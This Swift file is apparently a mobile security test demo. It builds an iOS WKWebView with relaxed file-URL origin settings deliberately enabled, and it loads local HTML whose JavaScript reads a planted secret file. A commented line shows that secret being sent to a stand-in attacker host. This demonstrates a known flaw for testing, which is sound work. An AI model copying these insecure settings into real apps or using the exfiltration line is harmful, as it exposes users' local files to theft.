import UIKit
import WebKit

struct MastgTest {

    private static let docDir = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first!
    private static let indexURL = docDir.appendingPathComponent("index.html")
    private static let secretURL = docDir.appendingPathComponent("secret.txt")

    public static func mastgTest(completion: @escaping (String) -> Void) {
        createSecretFile()
        createHtmlFile()

        DispatchQueue.main.async {
            showWebView(completion: completion)
        }
    }

    private static func showWebView(completion: @escaping (String) -> Void) {
        let configuration = WKWebViewConfiguration()

        // Unsupported or non public configuration paths on iOS.
        configuration.preferences.setValue(true, forKey: "allowFileAccessFromFileURLs")
        configuration.setValue(true, forKey: "allowUniversalAccessFromFileURLs")

        let webView = WKWebView(frame: .zero, configuration: configuration)

        let vc = UIViewController()
        vc.view = webView

        guard let presenter = topViewController() else {
            completion("Failed to present, no view controller.")
            return
        }

        presenter.present(vc, animated: true) {
            completion("Loading local file with relaxed file origin policies enabled.")
            webView.loadFileURL(indexURL, allowingReadAccessTo: docDir)
        }
    }

    private static func createHtmlFile() {
        let htmlContent = """
        <!DOCTYPE html>
        <html>
        <head>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Local File Access Demo</title>
        </head>
        <body>
            <h1>Local File Access Demo</h1>
            <p>This page attempts to read another local file using JavaScript.</p>

            <p><b>Result:</b></p>
            <pre id="result">Loading...</pre>

            <script>
            async function readLocalSecret() {
                try {
                    const response = await fetch("./secret.txt");
                    const text = await response.text();
                    document.getElementById("result").textContent = text;

                    // Optional exfiltration demonstration for controlled testing only.
                    // This requires allowUniversalAccessFromFileURLs and a test server.
                    //
                    // await fetch("https://attacker.example/collect?data=" + encodeURIComponent(text), {
                    //     method: "GET",
                    //     mode: "cors"
                    // });

                } catch (error) {
                    document.getElementById("result").textContent =
                        "Failed to read local file: " + error;
                }
            }

            readLocalSecret();
            </script>
        </body>
        </html>
        """
        try? htmlContent.write(to: indexURL, atomically: true, encoding: .utf8)
    }

    private static func createSecretFile() {
        try? "MY SECRET".write(to: secretURL, atomically: true, encoding: .utf8)
    }

    private static func topViewController(base: UIViewController? = nil) -> UIViewController? {
        let root = base ?? UIApplication.shared.connectedScenes
            .compactMap { $0 as? UIWindowScene }
            .flatMap { $0.windows }
            .first { $0.isKeyWindow }?.rootViewController

        if let nav = root as? UINavigationController {
            return topViewController(base: nav.visibleViewController)
        }
        if let tab = root as? UITabBarController {
            return topViewController(base: tab.selectedViewController)
        }
        if let presented = root?.presentedViewController {
            return topViewController(base: presented)
        }
        return root
    }
}